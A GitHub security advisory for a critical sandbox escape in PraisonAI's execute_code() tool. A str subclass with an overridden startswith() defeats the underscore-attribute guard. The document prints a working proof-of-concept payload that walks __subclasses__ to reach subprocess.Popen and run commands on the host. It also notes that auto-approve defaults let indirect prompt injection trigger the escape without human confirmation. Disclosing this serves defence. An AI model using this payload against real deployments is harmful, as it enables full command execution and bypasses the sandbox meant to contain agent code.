# [C] PraisonAI: Python Sandbox Escape via str Subclass startswith() Override in execute_code

## Summary
Severity: Critical
Advisory: GHSA-6vh2-h83c-9294
CVE: CVE-2026-34938
CWE: CWE-693
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-6vh2-h83c-9294
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.5.90

## Details
### Summary

`execute_code()` in `praisonai-agents` runs attacker-controlled Python inside a three-layer sandbox that can be fully bypassed by passing a `str` subclass with an overridden `startswith()` method to the `_safe_getattr` wrapper, achieving arbitrary OS command execution on the host.

### Details

`python_tools.py:20` (source) -> `python_tools.py:22` (guard bypass) -> `python_tools.py:161` (sink)
```python
# source -- _safe_getattr accepts any str subclass
def _safe_getattr(obj, name, *default):
    if isinstance(name, str) and name.startswith('_'):  # isinstance passes for subclasses
        raise AttributeError(...)

# hop -- type() is whitelisted in safe_builtins, creates str subclass without class keyword
FakeStr = type('FakeStr', (str,), {'startswith': lambda self, *a: False})

# sink -- Popen reached via __subclasses__ walk
r = Popen(['id'], stdout=PIPE, stderr=PIPE)
```

### PoC
```python

from praisonaiagents.tools.python_tools import execute_code

payload = """
t = type
FakeStr = t('FakeStr', (str,), {'startswith': lambda self, *a: False})

mro_attr  = FakeStr(''.join(['_','_','m','r','o','_','_']))
subs_attr = FakeStr(''.join(['_','_','s','u','b','c','l','a','s','s','e','s','_','_']))
mod_attr  = FakeStr(''.join(['_','_','m','o','d','u','l','e','_','_']))
name_attr = FakeStr(''.join(['_','_','n','a','m','e','_','_']))
PIPE = -1

obj_class = getattr(type(()), mro_attr)[1]
for cls in getattr(obj_class, subs_attr)():
    try:
        m = getattr(cls, mod_attr, '')
        n = getattr(cls, name_attr, '')
        if m == 'subprocess' and n == 'Popen':
            r = cls(['id'], stdout=PIPE, stderr=PIPE)
            out, err = r.communicate()
            print('RCE:', out.decode())
            break
    except Exception as e:
        print('ERR:', e)
"""

result = execute_code(code=payload)
print(result)
# expected output: RCE: uid=1000(narey) gid=1000(narey) groups=1000(narey)...
```

### Impact

Any user or agent pipeline running `execute_code()` is exposed to full OS command execution as the process user. Deployments using `bot.py`, `autonomy_mode.py`, or `bots_cli.py` set `PRAISONAI_AUTO_APPROVE=true` by default, meaning no human confirmation is required and the tool fires silently when triggered via indirect prompt injection.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6vh2-h83c-9294
- https://nvd.nist.gov/vuln/detail/CVE-2026-34938
- https://github.com/MervinPraison/PraisonAI
